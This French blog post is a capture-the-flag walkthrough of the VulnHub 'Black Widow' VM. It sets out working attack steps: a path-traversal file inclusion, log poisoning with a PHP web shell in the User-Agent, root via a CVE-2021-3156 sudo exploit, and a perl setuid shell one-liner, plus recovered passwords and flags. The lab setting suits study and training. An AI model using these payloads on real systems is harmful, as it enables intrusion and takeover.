# Solution du CTF Black Widow de VulnHub

Intro
-----

[Black Widow](https://www.vulnhub.com/entry/black-widow-1,637/) est un CTF créé par *0xJin* et *mindsflee*, disponible sur VulnHub.  

Le CTF est de type boot2root avec un cas d'exploitation web classique qui aurait dû me prendre seulement quelques minutes mais un bug sur le CTF en a décidé autrement :p  

Le scan Nmap nous retourne une pléthore de ports liés aux différents services RPC. NFS aurait pu être de la partie mais aucun export n'est présent.  

Un proxy Squid tourne mais ne nous permet pas d'aller voir en interne (*curl -x http://192.168.56.25:3128/ http://localhost/* nous refuse l'accès).  

```plain
$ sudo nmap -T5 -p- -sCV 192.168.56.25  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-11 20:16 CET 
Nmap scan report for 192.168.56.25 
Host is up (0.00011s latency). 
Not shown: 65526 closed tcp ports (reset) 
PORT      STATE SERVICE    VERSION 
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 
| ssh-hostkey:  
|   2048 f8:3b:7c:ca:c2:f6:5a:a6:0e:3f:f9:cf:1b:a9:dd:1e (RSA) 
|   256 04:31:5a:34:d4:9b:14:71:a0:0f:22:78:2d:f3:b6:f6 (ECDSA) 
|_  256 4e:42:8e:69:b7:90:e8:27:68:df:68:8a:83:a7:87:9c (ED25519) 
80/tcp    open  http       Apache httpd 2.4.38 ((Debian)) 
|_http-server-header: Apache/2.4.38 (Debian) 
|_http-title: Site doesn't have a title (text/html). 
111/tcp   open  rpcbind    2-4 (RPC #100000) 
| rpcinfo:  
|   program version    port/proto  service 
|   100000  2,3,4        111/tcp   rpcbind 
|   100000  2,3,4        111/udp   rpcbind 
|   100000  3,4          111/tcp6  rpcbind 
|   100000  3,4          111/udp6  rpcbind 
|   100003  3           2049/udp   nfs 
|   100003  3           2049/udp6  nfs 
|   100003  3,4         2049/tcp   nfs 
|   100003  3,4         2049/tcp6  nfs 
|   100005  1,2,3      36713/udp   mountd 
|   100005  1,2,3      44363/tcp   mountd 
|   100005  1,2,3      57572/udp6  mountd 
|   100005  1,2,3      60195/tcp6  mountd 
|   100021  1,3,4      35689/tcp   nlockmgr 
|   100021  1,3,4      44158/udp   nlockmgr 
|   100021  1,3,4      44621/tcp6  nlockmgr 
|   100021  1,3,4      48444/udp6  nlockmgr 
|   100227  3           2049/tcp   nfs_acl 
|   100227  3           2049/tcp6  nfs_acl 
|   100227  3           2049/udp   nfs_acl 
|_  100227  3           2049/udp6  nfs_acl 
2049/tcp  open  nfs_acl    3 (RPC #100227) 
3128/tcp  open  http-proxy Squid http proxy 4.6 
|_http-server-header: squid/4.6 
|_http-title: ERROR: The requested URL could not be retrieved 
35689/tcp open  nlockmgr   1-4 (RPC #100021) 
44363/tcp open  mountd     1-3 (RPC #100005) 
53631/tcp open  mountd     1-3 (RPC #100005) 
54727/tcp open  mountd     1-3 (RPC #100005)
```

Conclusion: on s'en tient au port 80 qu'on maltraite avec l'aide de *Feroxbuster*. L'outil de brute force de paths nous trouve un dossier */company* à la racine du site.  

Assez rapidement je remarque en commentaire HTML le message suivant :  

> We are working to develop a php inclusion method using "file" parameter - Black Widow DevOps Team.

Je n'ai pas vraiment de fichier php à tester donc re-coup de *Feroxbuster* sur les fichiers et il en ressort un fichier *started.php*.  

Je parviens à reproduire la vulnérabilité d'inclusion avec la commande suivante :  

```bash
ffuf -w /wordlists/files/JHADDIX_LFI.txt -u http://192.168.56.25/company/started.php?file=FUZZ -fs 0
```

Il faut remonter une bonne quantité de dossiers avant d'atteindre la racine :  

```plain
http://192.168.56.25/company/started.php?file=../../../../../../../../../../../../../etc/passwd
```

L'étape suivante est bien sûr d'injecter du PHP dans un fichier présent sur le disque avant de l'inclure et là... catastrophe, j'ai tout essayé sans obtenir quoi que ce soit.  

Je me suis dirigé sur l'hypothèse du bug du CTF quand j'ai vu qu'inclure */var/log/apache2/access.log.1* retournait un résultat mais que l'on avait rien pour */var/log/apache2/access.log*.  

Les auteurs du CTF ont en effet simplement dû changer les permissions sur les logs manuellement mais comme logrotate fonctionne, quand moi j'ai démarré la VM, celle-ci a synchronisé son horloge et logrorate a archivé le fichier de log courant pour en créer un nouveau qui a les permissions par défaut (c'est à dire qu'on ne peut pas l'inclure).  

Par conséquent, boot sur la VM avec édition de l'entrée GRUB pour avoir un shell et correction des permissions pour avoir la même situation que les autres personnes ayant déjà résolu ce CTF :-(  

Injection de logs
-----------------

On part sur du classique à savoir passer du PHP dans le User-Agent en évitant d'y mettre apostrophes et guillemets qui risqueraient d'être échapés.  

```bash
curl -A '<?php system($_GET[chr(99)]); ?>' http://192.168.56.25/
```

Cette fois ça fonctionne !  

```plain
http://192.168.56.25/company/started.php?file=../../../../../../../../../../../../..//var/log/apache2/access.log&c=id
```

Kansas City Shuffle
-------------------

On peut passer directement de *www-data* à *root* via la faille sudo :  

```plain
www-data@blackwidow:/tmp/CVE-2021-3156-main$ python exploit_nss.py 
sudoedit: unable to resolve host blackwidow: Temporary failure in name resolution 
# id 
uid=0(root) gid=0(root) groups=0(root),33(www-data) 
# cd /root 
# ls  
root.txt 
# cat root.txt 

▄▄▄▄· ▄▄▌   ▄▄▄·  ▄▄· ▄ •▄     ▄▄▌ ▐ ▄▌▪  ·▄▄▄▄        ▄▄▌ ▐ ▄▌ 
▐█ ▀█▪██•  ▐█ ▀█ ▐█ ▌▪█▌▄▌▪    ██· █▌▐███ ██▪ ██ ▪     ██· █▌▐█ 
▐█▀▀█▄██▪  ▄█▀▀█ ██ ▄▄▐▀▀▄·    ██▪▐█▐▐▌▐█·▐█· ▐█▌ ▄█▀▄ ██▪▐█▐▐▌ 
██▄▪▐█▐█▌▐▌▐█ ▪▐▌▐███▌▐█.█▌    ▐█▌██▐█▌▐█▌██. ██ ▐█▌.▐▌▐█▌██▐█▌ 
·▀▀▀▀ .▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀     ▀▀▀▀ ▀▪▀▀▀▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀ ▀▪ 

Congrats! 

You've rooted Black Widow! 

0xJin - mindsflee 

0780eb289a44ba17ea499ffa6322b335
```

Regular
-------

Mais on peut voir sur le système un utilisateur *viper* qui dispose d'un fichier *local.txt* (sans doute un flag) dans son répertoire...  

A première vue LinPEAS ne remonte rien d'excitant. Il y a quand même ces capabilities vides sur le binaire perl qui m'échappent :  

```plain
Files with capabilities (limited to 50): 
/usr/bin/perl = 
/usr/bin/perl5.28.1 = 
/usr/bin/ping = cap_net_raw+ep 
/usr/lib/squid/pinger = cap_net_raw+ep
```

Qu'est-ce que ça signifie ? J'ai testé par exemple de lire */etc/shadow* avec mais sans résultats.  

LinPEAS donne aussi une liste de fichiers de logs auxquels on a accès et il y a notamment le fichier */var/backups/auth.log*.  

Une permissions en lecture sur le véritable *auth.log* m'aurait bien aidé pour la faille d'inclusion... Voyons voir ce qu'il y a dans ce fichier.  

```plain
Dec 12 16:56:46 test sshd[29560]: Failed password for invalid user ?V1p3r2020!? from 192.168.1.109 port 7090 ssh2
```

Cette ligne est la plus intéressante. L'utilisateur a visiblement tapé son mot de passe quand le nom d'utilisateur lui était demandé.  

On peut ainsi se connecter sur le compte via SSH.  

Fatality
--------

On peut donc obtenir le flag utilisateur :  

```plain
viper@blackwidow:~$ cat local.txt  
d930fe79919376e6d08972dae222526b
```

L'historique bash de Viper n'a pas été vidé et on peut voir par exemple ces commandes :  

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
--- snip ---
cd backup_site/ 
ls -lrt 
cd assets 
ls -lrt 
cd vendor 
ls -lrt 
cd weapon/ 
ls 
./arsenic -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
--- snip ---

```

Comme vu plus tôt le binaire perl ne dispose plus de capabilities. En revanche on peut reprendre les autres commandes car le fichier *arsenic* est bien présent à l'emplacement attendu :  

```plain

viper@blackwidow:~/backup_site/assets/vendor/weapon$ ./arsenic -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";' 
# id 
uid=0(root) gid=1001(viper) groups=1001(viper)
```


*Published January 12 2022 at 13 33*